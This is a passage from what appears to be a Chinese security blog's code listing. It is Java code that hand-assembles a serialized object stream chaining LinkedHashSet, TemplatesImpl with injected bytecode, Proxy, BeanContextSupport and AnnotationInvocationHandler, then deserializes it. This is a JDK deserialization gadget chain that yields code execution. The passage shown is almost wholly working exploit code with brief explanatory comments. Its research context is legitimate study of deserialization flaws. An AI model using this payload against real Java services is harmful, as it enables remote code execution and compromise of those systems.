</span></span><span style="display:flex;"><span>        <span style="color:#e06c75">bytecodesField</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">set</span><span style="color:#56b6c2">(</span><span style="color:#e06c75">templatesImpl</span><span style="color:#56b6c2">,</span><span style="color:#e06c75">bytes</span><span style="color:#56b6c2">);</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#e06c75">Field</span> <span style="color:#e06c75">tfactoryField</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">tc</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">getDeclaredField</span><span style="color:#56b6c2">(</span><span style="color:#98c379">&#34;_tfactory&#34;</span><span style="color:#56b6c2">);</span>
</span></span><span style="display:flex;"><span>        <span style="color:#e06c75">tfactoryField</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">setAccessible</span><span style="color:#56b6c2">(</span><span style="color:#e5c07b">true</span><span style="color:#56b6c2">);</span>
</span></span><span style="display:flex;"><span>        <span style="color:#e06c75">tfactoryField</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">set</span><span style="color:#56b6c2">(</span><span style="color:#e06c75">templatesImpl</span><span style="color:#56b6c2">,</span><span style="color:#c678dd">new</span> <span style="color:#e06c75">TransformerFactoryImpl</span><span style="color:#56b6c2">());</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#e06c75">Object</span><span style="color:#56b6c2">[]</span> <span style="color:#e06c75">serializedObject</span> <span style="color:#56b6c2">=</span> <span style="color:#c678dd">new</span> <span style="color:#e06c75">Object</span><span style="color:#56b6c2">[]{</span>
</span></span><span style="display:flex;"><span>                <span style="color:#e06c75">STREAM_MAGIC</span><span style="color:#56b6c2">,</span>
</span></span><span style="display:flex;"><span>                <span style="color:#e06c75">STREAM_VERSION</span><span style="color:#56b6c2">,</span>
</span></span><span style="display:flex;"><span>                    <span style="color:#7f848e">//Contents
</span></span></span><span style="display:flex;"><span><span style="color:#7f848e"></span>                    <span style="color:#e06c75">TC_OBJECT</span><span style="color:#56b6c2">,</span>
</span></span><span style="display:flex;"><span>                        <span style="color:#e06c75">TC_CLASSDESC</span><span style="color:#56b6c2">,</span>
</span></span><span style="display:flex;"><span>                        <span style="color:#7f848e">//className
</span></span></span><span style="display:flex;"><span><span style="color:#7f848e"></span>                        <span style="color:#e06c75">LinkedHashSet</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">class</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">getName</span><span style="color:#56b6c2">(),</span>
</span></span><span style="display:flex;"><span>                        <span style="color:#7f848e">//seriavalVersionUID
</span></span></span><span style="display:flex;"><span><span style="color:#7f848e"></span>                        <span style="color:#56b6c2">-</span><span style="color:#d19a66">2851667679971038690L</span><span style="color:#56b6c2">,</span>
</span></span><span style="display:flex;"><span>                        <span style="color:#7f848e">//classDescFlags
</span></span></span><span style="display:flex;"><span><span style="color:#7f848e"></span>                        <span style="color:#56b6c2">(</span><span style="color:#e5c07b">byte</span><span style="color:#56b6c2">)</span><span style="color:#e06c75">SC_SERIALIZABLE</span><span style="color:#56b6c2">,</span>
</span></span><span style="display:flex;"><span>                        <span style="color:#7f848e">//fieldCount
</span></span></span><span style="display:flex;"><span><span style="color:#7f848e"></span>                        <span style="color:#56b6c2">(</span><span style="color:#e5c07b">short</span><span style="color:#56b6c2">)</span><span style="color:#d19a66">0</span><span style="color:#56b6c2">,</span>
</span></span><span style="display:flex;"><span>                        <span style="color:#7f848e">//classAnnotations
</span></span></span><span style="display:flex;"><span><span style="color:#7f848e"></span>                        <span style="color:#e06c75">TC_ENDBLOCKDATA</span><span style="color:#56b6c2">,</span>
</span></span><span style="display:flex;"><span>                        <span style="color:#7f848e">//superClassDesc
</span></span></span><span style="display:flex;"><span><span style="color:#7f848e"></span>                            <span style="color:#e06c75">TC_CLASSDESC</span><span style="color:#56b6c2">,</span>
</span></span><span style="display:flex;"><span>                            <span style="color:#7f848e">//className
</span></span></span><span style="display:flex;"><span><span style="color:#7f848e"></span>                            <span style="color:#e06c75">HashSet</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">class</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">getName</span><span style="color:#56b6c2">(),</span>
</span></span><span style="display:flex;"><span>                            <span style="color:#7f848e">//seriavalVersionUID
</span></span></span><span style="display:flex;"><span><span style="color:#7f848e"></span>                            <span style="color:#56b6c2">-</span><span style="color:#d19a66">5024744406713321676L</span><span style="color:#56b6c2">,</span>
</span></span><span style="display:flex;"><span>                            <span style="color:#7f848e">//classDescFlags
</span></span></span><span style="display:flex;"><span><span style="color:#7f848e"></span>                            <span style="color:#56b6c2">(</span><span style="color:#e5c07b">byte</span><span style="color:#56b6c2">)(</span><span style="color:#e06c75">SC_WRITE_METHOD</span><span style="color:#56b6c2">|</span><span style="color:#e06c75">SC_SERIALIZABLE</span><span style="color:#56b6c2">),</span>
</span></span><span style="display:flex;"><span>                            <span style="color:#7f848e">//fieldCount
</span></span></span><span style="display:flex;"><span><span style="color:#7f848e"></span>                            <span style="color:#56b6c2">(</span><span style="color:#e5c07b">short</span><span style="color:#56b6c2">)</span><span style="color:#d19a66">0</span><span style="color:#56b6c2">,</span>
</span></span><span style="display:flex;"><span>                            <span style="color:#7f848e">//classAnnotations
</span></span></span><span style="display:flex;"><span><span style="color:#7f848e"></span>                            <span style="color:#e06c75">TC_ENDBLOCKDATA</span><span style="color:#56b6c2">,</span>
</span></span><span style="display:flex;"><span>                            <span style="color:#7f848e">//superClassDesc
</span></span></span><span style="display:flex;"><span><span style="color:#7f848e"></span>                            <span style="color:#e06c75">TC_NULL</span><span style="color:#56b6c2">,</span>
</span></span><span style="display:flex;"><span>                        <span style="color:#7f848e">//classdata
</span></span></span><span style="display:flex;"><span><span style="color:#7f848e"></span>                            <span style="color:#7f848e">//java.util.HashSet
</span></span></span><span style="display:flex;"><span><span style="color:#7f848e"></span>                                <span style="color:#7f848e">//ObjectAnnotation
</span></span></span><span style="display:flex;"><span><span style="color:#7f848e"></span>                                <span style="color:#e06c75">TC_BLOCKDATA</span><span style="color:#56b6c2">,</span>
</span></span><span style="display:flex;"><span>                                <span style="color:#56b6c2">(</span><span style="color:#e5c07b">byte</span><span style="color:#56b6c2">)</span><span style="color:#d19a66">12</span><span style="color:#56b6c2">,</span> <span style="color:#56b6c2">(</span><span style="color:#e5c07b">short</span><span style="color:#56b6c2">)</span><span style="color:#d19a66">0</span><span style="color:#56b6c2">,</span> <span style="color:#56b6c2">(</span><span style="color:#e5c07b">short</span><span style="color:#56b6c2">)</span><span style="color:#d19a66">16</span><span style="color:#56b6c2">,</span> <span style="color:#56b6c2">(</span><span style="color:#e5c07b">short</span><span style="color:#56b6c2">)</span><span style="color:#d19a66">16192</span><span style="color:#56b6c2">,</span> <span style="color:#56b6c2">(</span><span style="color:#e5c07b">short</span><span style="color:#56b6c2">)</span><span style="color:#d19a66">0</span><span style="color:#56b6c2">,</span> <span style="color:#56b6c2">(</span><span style="color:#e5c07b">short</span><span style="color:#56b6c2">)</span><span style="color:#d19a66">0</span><span style="color:#56b6c2">,</span> <span style="color:#56b6c2">(</span><span style="color:#e5c07b">short</span><span style="color:#56b6c2">)</span><span style="color:#d19a66">2</span><span style="color:#56b6c2">,</span>   <span style="color:#7f848e">//最后一个2表示元素个数
</span></span></span><span style="display:flex;"><span><span style="color:#7f848e"></span>                                <span style="color:#7f848e">//contents
</span></span></span><span style="display:flex;"><span><span style="color:#7f848e"></span>                                <span style="color:#7f848e">//LinkedHashSet的第一个元素templatesImpl
</span></span></span><span style="display:flex;"><span><span style="color:#7f848e"></span>                                <span style="color:#e06c75">templatesImpl</span><span style="color:#56b6c2">,</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>                                <span style="color:#7f848e">//LinkedHashSet的第二个元素proxy
</span></span></span><span style="display:flex;"><span><span style="color:#7f848e"></span>                                <span style="color:#e06c75">TC_OBJECT</span><span style="color:#56b6c2">,</span>
</span></span><span style="display:flex;"><span>                                    <span style="color:#e06c75">TC_PROXYCLASSDESC</span><span style="color:#56b6c2">,</span>
</span></span><span style="display:flex;"><span>                                    <span style="color:#d19a66">1</span><span style="color:#56b6c2">,</span>
</span></span><span style="display:flex;"><span>                                    <span style="color:#e06c75">Templates</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">class</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">getName</span><span style="color:#56b6c2">(),</span>
</span></span><span style="display:flex;"><span>                                    <span style="color:#e06c75">TC_ENDBLOCKDATA</span><span style="color:#56b6c2">,</span>
</span></span><span style="display:flex;"><span>                                    <span style="color:#7f848e">//superclass
</span></span></span><span style="display:flex;"><span><span style="color:#7f848e"></span>                                    <span style="color:#e06c75">TC_CLASSDESC</span><span style="color:#56b6c2">,</span>
</span></span><span style="display:flex;"><span>                                    <span style="color:#e06c75">Proxy</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">class</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">getName</span><span style="color:#56b6c2">(),</span>
</span></span><span style="display:flex;"><span>                                    <span style="color:#56b6c2">-</span><span style="color:#d19a66">2222568056686623797L</span><span style="color:#56b6c2">,</span>
</span></span><span style="display:flex;"><span>                                    <span style="color:#e06c75">SC_SERIALIZABLE</span><span style="color:#56b6c2">,</span>
</span></span><span style="display:flex;"><span>                                    <span style="color:#56b6c2">(</span><span style="color:#e5c07b">short</span><span style="color:#56b6c2">)</span><span style="color:#d19a66">2</span><span style="color:#56b6c2">,</span>
</span></span><span style="display:flex;"><span>                                    <span style="color:#7f848e">//这里需要填上L, 所以就不用getName了
</span></span></span><span style="display:flex;"><span><span style="color:#7f848e"></span>                                    <span style="color:#7f848e">//另外注意后面要加分号
</span></span></span><span style="display:flex;"><span><span style="color:#7f848e"></span>                                    <span style="color:#56b6c2">(</span><span style="color:#e5c07b">byte</span><span style="color:#56b6c2">)</span> <span style="color:#98c379">&#39;L&#39;</span><span style="color:#56b6c2">,</span> <span style="color:#98c379">&#34;tmpFiled&#34;</span><span style="color:#56b6c2">,</span> <span style="color:#e06c75">TC_STRING</span><span style="color:#56b6c2">,</span> <span style="color:#98c379">&#34;Ljava/lang/Object;&#34;</span><span style="color:#56b6c2">,</span>
</span></span><span style="display:flex;"><span>                                    <span style="color:#56b6c2">(</span><span style="color:#e5c07b">byte</span><span style="color:#56b6c2">)</span> <span style="color:#98c379">&#39;L&#39;</span><span style="color:#56b6c2">,</span> <span style="color:#98c379">&#34;h&#34;</span><span style="color:#56b6c2">,</span> <span style="color:#e06c75">TC_STRING</span><span style="color:#56b6c2">,</span> <span style="color:#98c379">&#34;Ljava/lang/reflect/InvocationHandler;&#34;</span><span style="color:#56b6c2">,</span>
</span></span><span style="display:flex;"><span>                                    <span style="color:#e06c75">TC_ENDBLOCKDATA</span><span style="color:#56b6c2">,</span>
</span></span><span style="display:flex;"><span>                                    <span style="color:#7f848e">//superclass
</span></span></span><span style="display:flex;"><span><span style="color:#7f848e"></span>                                    <span style="color:#e06c75">TC_NULL</span><span style="color:#56b6c2">,</span>
</span></span><span style="display:flex;"><span>                                    <span style="color:#7f848e">//classdata
</span></span></span><span style="display:flex;"><span><span style="color:#7f848e"></span>                                        <span style="color:#7f848e">//tmpFiled --&gt; BeanContextSupport
</span></span></span><span style="display:flex;"><span><span style="color:#7f848e"></span>                                        <span style="color:#e06c75">TC_OBJECT</span><span style="color:#56b6c2">,</span>
</span></span><span style="display:flex;"><span>                                            <span style="color:#e06c75">TC_CLASSDESC</span><span style="color:#56b6c2">,</span>
</span></span><span style="display:flex;"><span>                                            <span style="color:#e06c75">BeanContextSupport</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">class</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">getName</span><span style="color:#56b6c2">(),</span>
</span></span><span style="display:flex;"><span>                                            <span style="color:#56b6c2">-</span><span style="color:#d19a66">4879613978649577204L</span><span style="color:#56b6c2">,</span>
</span></span><span style="display:flex;"><span>                                            <span style="color:#56b6c2">(</span><span style="color:#e5c07b">byte</span><span style="color:#56b6c2">)</span> <span style="color:#56b6c2">(</span><span style="color:#e06c75">SC_WRITE_METHOD</span><span style="color:#56b6c2">|</span><span style="color:#e06c75">SC_SERIALIZABLE</span><span style="color:#56b6c2">),</span>
</span></span><span style="display:flex;"><span>                                            <span style="color:#56b6c2">(</span><span style="color:#e5c07b">short</span><span style="color:#56b6c2">)</span> <span style="color:#d19a66">1</span><span style="color:#56b6c2">,</span>
</span></span><span style="display:flex;"><span>                                            <span style="color:#56b6c2">(</span><span style="color:#e5c07b">byte</span><span style="color:#56b6c2">)</span> <span style="color:#98c379">&#39;I&#39;</span><span style="color:#56b6c2">,</span> <span style="color:#98c379">&#34;serializable&#34;</span><span style="color:#56b6c2">,</span> <span style="color:#7f848e">//只需要serialzable这一个成员变量
</span></span></span><span style="display:flex;"><span><span style="color:#7f848e"></span>                                            <span style="color:#e06c75">TC_ENDBLOCKDATA</span><span style="color:#56b6c2">,</span>
</span></span><span style="display:flex;"><span>                                            <span style="color:#7f848e">//superclass --&gt; BeanContextChildSupport
</span></span></span><span style="display:flex;"><span><span style="color:#7f848e"></span>                                                <span style="color:#e06c75">TC_CLASSDESC</span><span style="color:#56b6c2">,</span>
</span></span><span style="display:flex;"><span>                                                <span style="color:#e06c75">BeanContextChildSupport</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">class</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">getName</span><span style="color:#56b6c2">(),</span>
</span></span><span style="display:flex;"><span>                                                <span style="color:#d19a66">6328947014421475877L</span><span style="color:#56b6c2">,</span>
</span></span><span style="display:flex;"><span>                                                <span style="color:#e06c75">SC_SERIALIZABLE</span><span style="color:#56b6c2">,</span>    <span style="color:#7f848e">//简化处理, 不用加上SC_WRITE_METHOD, 因为用不到
</span></span></span><span style="display:flex;"><span><span style="color:#7f848e"></span>                                                <span style="color:#56b6c2">(</span><span style="color:#e5c07b">short</span><span style="color:#56b6c2">)</span> <span style="color:#d19a66">1</span><span style="color:#56b6c2">,</span>
</span></span><span style="display:flex;"><span>                                                <span style="color:#56b6c2">(</span><span style="color:#e5c07b">byte</span><span style="color:#56b6c2">)</span> <span style="color:#98c379">&#39;L&#39;</span><span style="color:#56b6c2">,</span> <span style="color:#98c379">&#34;beanContextChildPeer&#34;</span><span style="color:#56b6c2">,</span> <span style="color:#e06c75">TC_STRING</span><span style="color:#56b6c2">,</span> <span style="color:#98c379">&#34;Ljava/beans/beancontext/BeanContextChild;&#34;</span><span style="color:#56b6c2">,</span>
</span></span><span style="display:flex;"><span>                                                <span style="color:#e06c75">TC_ENDBLOCKDATA</span><span style="color:#56b6c2">,</span>
</span></span><span style="display:flex;"><span>                                                <span style="color:#7f848e">//superclass
</span></span></span><span style="display:flex;"><span><span style="color:#7f848e"></span>                                                <span style="color:#e06c75">TC_NULL</span><span style="color:#56b6c2">,</span>
</span></span><span style="display:flex;"><span>                                            <span style="color:#7f848e">//classdata
</span></span></span><span style="display:flex;"><span><span style="color:#7f848e"></span>                                                <span style="color:#7f848e">//BeanContextChildSupport
</span></span></span><span style="display:flex;"><span><span style="color:#7f848e"></span>                                                    <span style="color:#7f848e">//beanContextChildPeer
</span></span></span><span style="display:flex;"><span><span style="color:#7f848e"></span>                                                    <span style="color:#e06c75">TC_REFERENCE</span><span style="color:#56b6c2">,</span> <span style="color:#e06c75">baseWireHandle</span> <span style="color:#56b6c2">+</span> <span style="color:#d19a66">25</span><span style="color:#56b6c2">,</span>   <span style="color:#7f848e">//引用beanContextSupport对象
</span></span></span><span style="display:flex;"><span><span style="color:#7f848e"></span>                                                <span style="color:#7f848e">//BeanContextSupport
</span></span></span><span style="display:flex;"><span><span style="color:#7f848e"></span>                                                    <span style="color:#7f848e">//serializable
</span></span></span><span style="display:flex;"><span><span style="color:#7f848e"></span>                                                    <span style="color:#d19a66">1</span><span style="color:#56b6c2">,</span>
</span></span><span style="display:flex;"><span>                                                    <span style="color:#7f848e">//objectAnnotation
</span></span></span><span style="display:flex;"><span><span style="color:#7f848e"></span>                                                    <span style="color:#e06c75">TC_OBJECT</span><span style="color:#56b6c2">,</span>
</span></span><span style="display:flex;"><span>                                                        <span style="color:#e06c75">TC_CLASSDESC</span><span style="color:#56b6c2">,</span>
</span></span><span style="display:flex;"><span>                                                        <span style="color:#98c379">&#34;sun.reflect.annotation.AnnotationInvocationHandler&#34;</span><span style="color:#56b6c2">,</span>
</span></span><span style="display:flex;"><span>                                                        <span style="color:#d19a66">6182022883658399397L</span><span style="color:#56b6c2">,</span>
</span></span><span style="display:flex;"><span>                                                        <span style="color:#56b6c2">(</span><span style="color:#e5c07b">byte</span><span style="color:#56b6c2">)</span> <span style="color:#56b6c2">(</span><span style="color:#e06c75">SC_SERIALIZABLE</span><span style="color:#56b6c2">|</span><span style="color:#e06c75">SC_WRITE_METHOD</span><span style="color:#56b6c2">),</span>
</span></span><span style="display:flex;"><span>                                                        <span style="color:#7f848e">//SC_WRITE_METHOD可不能省略了,运行到readBlockHeader()会有问题
</span></span></span><span style="display:flex;"><span><span style="color:#7f848e"></span>                                                        <span style="color:#7f848e">// 不过这里的objectAnnotation可以不用加
</span></span></span><span style="display:flex;"><span><span style="color:#7f848e"></span>                                                        <span style="color:#56b6c2">(</span><span style="color:#e5c07b">short</span><span style="color:#56b6c2">)</span> <span style="color:#d19a66">2</span><span style="color:#56b6c2">,</span>
</span></span><span style="display:flex;"><span>                                                        <span style="color:#7f848e">//这里需要填上L, 所以就不用getName了
</span></span></span><span style="display:flex;"><span><span style="color:#7f848e"></span>                                                        <span style="color:#56b6c2">(</span><span style="color:#e5c07b">byte</span><span style="color:#56b6c2">)</span> <span style="color:#98c379">&#39;L&#39;</span><span style="color:#56b6c2">,</span> <span style="color:#98c379">&#34;memberValues&#34;</span><span style="color:#56b6c2">,</span> <span style="color:#e06c75">TC_STRING</span><span style="color:#56b6c2">,</span> <span style="color:#98c379">&#34;Ljava/util/Map;&#34;</span><span style="color:#56b6c2">,</span>
</span></span><span style="display:flex;"><span>                                                        <span style="color:#56b6c2">(</span><span style="color:#e5c07b">byte</span><span style="color:#56b6c2">)</span> <span style="color:#98c379">&#39;L&#39;</span><span style="color:#56b6c2">,</span> <span style="color:#98c379">&#34;type&#34;</span><span style="color:#56b6c2">,</span> <span style="color:#e06c75">TC_STRING</span><span style="color:#56b6c2">,</span> <span style="color:#98c379">&#34;Ljava/lang/Class;&#34;</span><span style="color:#56b6c2">,</span>
</span></span><span style="display:flex;"><span>                                                        <span style="color:#e06c75">TC_ENDBLOCKDATA</span><span style="color:#56b6c2">,</span>
</span></span><span style="display:flex;"><span>                                                        <span style="color:#e06c75">TC_NULL</span><span style="color:#56b6c2">,</span>
</span></span><span style="display:flex;"><span>                                                        <span style="color:#7f848e">//classdata
</span></span></span><span style="display:flex;"><span><span style="color:#7f848e"></span>                                                            <span style="color:#7f848e">//memberValues
</span></span></span><span style="display:flex;"><span><span style="color:#7f848e"></span>                                                            <span style="color:#e06c75">TC_OBJECT</span><span style="color:#56b6c2">,</span>
</span></span><span style="display:flex;"><span>                                                                <span style="color:#e06c75">TC_CLASSDESC</span><span style="color:#56b6c2">,</span>
</span></span><span style="display:flex;"><span>                                                                <span style="color:#e06c75">HashMap</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">class</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">getName</span><span style="color:#56b6c2">(),</span>
</span></span><span style="display:flex;"><span>                                                                <span style="color:#d19a66">362498820763181265L</span><span style="color:#56b6c2">,</span>
</span></span><span style="display:flex;"><span>                                                                <span style="color:#56b6c2">(</span><span style="color:#e5c07b">byte</span><span style="color:#56b6c2">)</span> <span style="color:#56b6c2">(</span><span style="color:#e06c75">SC_WRITE_METHOD</span><span style="color:#56b6c2">|</span><span style="color:#e06c75">SC_SERIALIZABLE</span><span style="color:#56b6c2">),</span>
</span></span><span style="display:flex;"><span>                                                                <span style="color:#56b6c2">(</span><span style="color:#e5c07b">short</span><span style="color:#56b6c2">)</span> <span style="color:#d19a66">2</span><span style="color:#56b6c2">,</span>
</span></span><span style="display:flex;"><span>                                                                <span style="color:#56b6c2">(</span><span style="color:#e5c07b">byte</span><span style="color:#56b6c2">)</span> <span style="color:#98c379">&#39;F&#39;</span><span style="color:#56b6c2">,</span> <span style="color:#98c379">&#34;loadFactor&#34;</span><span style="color:#56b6c2">,</span>
</span></span><span style="display:flex;"><span>                                                                <span style="color:#56b6c2">(</span><span style="color:#e5c07b">byte</span><span style="color:#56b6c2">)</span> <span style="color:#98c379">&#39;I&#39;</span><span style="color:#56b6c2">,</span> <span style="color:#98c379">&#34;threshold&#34;</span><span style="color:#56b6c2">,</span>
</span></span><span style="display:flex;"><span>                                                                <span style="color:#e06c75">TC_ENDBLOCKDATA</span><span style="color:#56b6c2">,</span>
</span></span><span style="display:flex;"><span>                                                                <span style="color:#e06c75">TC_NULL</span><span style="color:#56b6c2">,</span>
</span></span><span style="display:flex;"><span>                                                                <span style="color:#7f848e">//classdata
</span></span></span><span style="display:flex;"><span><span style="color:#7f848e"></span>                                                                <span style="color:#d19a66">0x3f400000</span><span style="color:#56b6c2">,</span>
</span></span><span style="display:flex;"><span>                                                                <span style="color:#d19a66">0x0000000c</span><span style="color:#56b6c2">,</span>
</span></span><span style="display:flex;"><span>                                                                <span style="color:#7f848e">//objectAnnotation
</span></span></span><span style="display:flex;"><span><span style="color:#7f848e"></span>                                                                <span style="color:#e06c75">TC_BLOCKDATA</span><span style="color:#56b6c2">,</span> <span style="color:#56b6c2">(</span><span style="color:#e5c07b">byte</span><span style="color:#56b6c2">)</span> <span style="color:#d19a66">8</span><span style="color:#56b6c2">,</span> <span style="color:#56b6c2">(</span><span style="color:#e5c07b">short</span><span style="color:#56b6c2">)</span> <span style="color:#d19a66">0</span><span style="color:#56b6c2">,</span> <span style="color:#56b6c2">(</span><span style="color:#e5c07b">short</span><span style="color:#56b6c2">)</span> <span style="color:#d19a66">16</span><span style="color:#56b6c2">,</span> <span style="color:#56b6c2">(</span><span style="color:#e5c07b">short</span><span style="color:#56b6c2">)</span> <span style="color:#d19a66">0</span><span style="color:#56b6c2">,</span> <span style="color:#56b6c2">(</span><span style="color:#e5c07b">short</span><span style="color:#56b6c2">)</span> <span style="color:#d19a66">1</span><span style="color:#56b6c2">,</span>
</span></span><span style="display:flex;"><span>                                                                <span style="color:#e06c75">TC_STRING</span><span style="color:#56b6c2">,</span> <span style="color:#98c379">&#34;f5a5a608&#34;</span><span style="color:#56b6c2">,</span>
</span></span><span style="display:flex;"><span>                                                                <span style="color:#e06c75">TC_REFERENCE</span><span style="color:#56b6c2">,</span> <span style="color:#e06c75">baseWireHandle</span> <span style="color:#56b6c2">+</span> <span style="color:#d19a66">10</span><span style="color:#56b6c2">,</span>   <span style="color:#7f848e">//引用templatesImpl
</span></span></span><span style="display:flex;"><span><span style="color:#7f848e"></span>                                                                <span style="color:#e06c75">TC_ENDBLOCKDATA</span><span style="color:#56b6c2">,</span>
</span></span><span style="display:flex;"><span>                                                            <span style="color:#7f848e">//type
</span></span></span><span style="display:flex;"><span><span style="color:#7f848e"></span>                                                            <span style="color:#e06c75">Templates</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">class</span><span style="color:#56b6c2">,</span>
</span></span><span style="display:flex;"><span>                                                <span style="color:#e06c75">TC_BLOCKDATA</span><span style="color:#56b6c2">,</span> <span style="color:#56b6c2">(</span><span style="color:#e5c07b">byte</span><span style="color:#56b6c2">)</span><span style="color:#d19a66">4</span><span style="color:#56b6c2">,</span> <span style="color:#d19a66">0</span><span style="color:#56b6c2">,</span> <span style="color:#e06c75">TC_ENDBLOCKDATA</span><span style="color:#56b6c2">,</span>  <span style="color:#7f848e">//这里把count置0
</span></span></span><span style="display:flex;"><span><span style="color:#7f848e"></span>                                        <span style="color:#7f848e">//h
</span></span></span><span style="display:flex;"><span><span style="color:#7f848e"></span>                                        <span style="color:#e06c75">TC_REFERENCE</span><span style="color:#56b6c2">,</span> <span style="color:#e06c75">baseWireHandle</span> <span style="color:#56b6c2">+</span> <span style="color:#d19a66">29</span><span style="color:#56b6c2">,</span>
</span></span><span style="display:flex;"><span>                            <span style="color:#e06c75">TC_ENDBLOCKDATA</span>
</span></span><span style="display:flex;"><span>        <span style="color:#56b6c2">};</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#7f848e">//        byte[] serializeddata = byteArrayOutputStream.toByteArray();
</span></span></span><span style="display:flex;"><span><span style="color:#7f848e">//
</span></span></span><span style="display:flex;"><span><span style="color:#7f848e"></span>
</span></span><span style="display:flex;"><span>        <span style="color:#e5c07b">byte</span><span style="color:#56b6c2">[]</span> <span style="color:#e06c75">serializedData</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">Converter</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">toBytes</span><span style="color:#56b6c2">(</span><span style="color:#e06c75">serializedObject</span><span style="color:#56b6c2">);</span>
</span></span><span style="display:flex;"><span>        <span style="color:#e06c75">serializedData</span> <span style="color:#56b6c2">=</span>  <span style="color:#e06c75">Replace</span><span style="color:#56b6c2">(</span><span style="color:#e06c75">serializedData</span><span style="color:#56b6c2">,</span> <span style="color:#98c379">&#34;5f6e616d6571007e0001&#34;</span><span style="color:#56b6c2">,</span> <span style="color:#98c379">&#34;5f6e616d657400124c6a6176612f6c616e672f537472696e673b&#34;</span><span style="color:#56b6c2">);</span>
</span></span><span style="display:flex;"><span>        <span style="color:#e06c75">System</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">out</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">println</span><span style="color:#56b6c2">(</span><span style="color:#e06c75">HexBin</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">encode</span><span style="color:#56b6c2">(</span><span style="color:#e06c75">serializedData</span><span style="color:#56b6c2">));</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#e06c75">ByteArrayInputStream</span> <span style="color:#e06c75">byteArrayInputStream</span> <span style="color:#56b6c2">=</span> <span style="color:#c678dd">new</span> <span style="color:#e06c75">ByteArrayInputStream</span><span style="color:#56b6c2">(</span><span style="color:#e06c75">serializedData</span><span style="color:#56b6c2">);</span>
</span></span><span style="display:flex;"><span>        <span style="color:#e06c75">ObjectInputStream</span> <span style="color:#e06c75">objectInputStream</span> <span style="color:#56b6c2">=</span> <span style="color:#c678dd">new</span> <span style="color:#e06c75">ObjectInputStream</span><span style="color:#56b6c2">(</span><span style="color:#e06c75">byteArrayInputStream</span><span style="color:#56b6c2">);</span>
</span></span><span style="display:flex;"><span>        <span style="color:#e06c75">Object</span> <span style="color:#e06c75">o</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">objectInputStream</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">readObject</span><span style="color:#56b6c2">();</span>
</span></span><span style="display:flex;"><span>        <span style="color:#e06c75">System</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">out</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">println</span><span style="color:#56b6c2">(</span><span style="color:#e06c75">o</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">getClass</span><span style="color:#56b6c2">());</span>
</span></span><span style="display:flex;"><span>    <span style="color:#56b6c2">}</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#7f848e">// 这里直接借用了现成的代码
</span></span></span><span style="display:flex;"><span><span style="color:#7f848e"></span>    <span style="color:#7f848e">// 引用自 http://slightlyrandombrokenthoughts.blogspot.com/2010/08/breaking-defensive-serialization.html
</span></span></span><span style="display:flex;"><span><span style="color:#7f848e"></span>    <span style="color:#c678dd">public</span> <span style="color:#c678dd">static</span> <span style="color:#c678dd">class</span> <span style="color:#e5c07b">Converter</span> <span style="color:#56b6c2">{</span>
</span></span><span style="display:flex;"><span>        <span style="color:#c678dd">public</span> <span style="color:#c678dd">static</span> <span style="color:#e5c07b">byte</span><span style="color:#56b6c2">[]</span> <span style="color:#61afef;font-weight:bold">toBytes</span><span style="color:#56b6c2">(</span><span style="color:#e06c75">Object</span><span style="color:#56b6c2">[]</span> <span style="color:#e06c75">objs</span><span style="color:#56b6c2">)</span> <span style="color:#c678dd">throws</span> <span style="color:#e06c75">IOException</span> <span style="color:#56b6c2">{</span>
</span></span><span style="display:flex;"><span>            <span style="color:#e06c75">ByteArrayOutputStream</span> <span style="color:#e06c75">baos</span> <span style="color:#56b6c2">=</span> <span style="color:#c678dd">new</span> <span style="color:#e06c75">ByteArrayOutputStream</span><span style="color:#56b6c2">();</span>
</span></span><span style="display:flex;"><span>            <span style="color:#e06c75">DataOutputStream</span> <span style="color:#e06c75">dos</span> <span style="color:#56b6c2">=</span> <span style="color:#c678dd">new</span> <span style="color:#e06c75">DataOutputStream</span><span style="color:#56b6c2">(</span><span style="color:#e06c75">baos</span><span style="color:#56b6c2">);</span>
</span></span><span style="display:flex;"><span>            <span style="color:#c678dd">for</span> <span style="color:#56b6c2">(</span><span style="color:#e06c75">Object</span> <span style="color:#e06c75">obj</span> <span style="color:#56b6c2">:</span> <span style="color:#e06c75">objs</span><span style="color:#56b6c2">)</span> <span style="color:#56b6c2">{</span>
</span></span><span style="display:flex;"><span>                <span style="color:#e06c75">treatObject</span><span style="color:#56b6c2">(</span><span style="color:#e06c75">dos</span><span style="color:#56b6c2">,</span> <span style="color:#e06c75">obj</span><span style="color:#56b6c2">);</span>
</span></span><span style="display:flex;"><span>            <span style="color:#56b6c2">}</span>
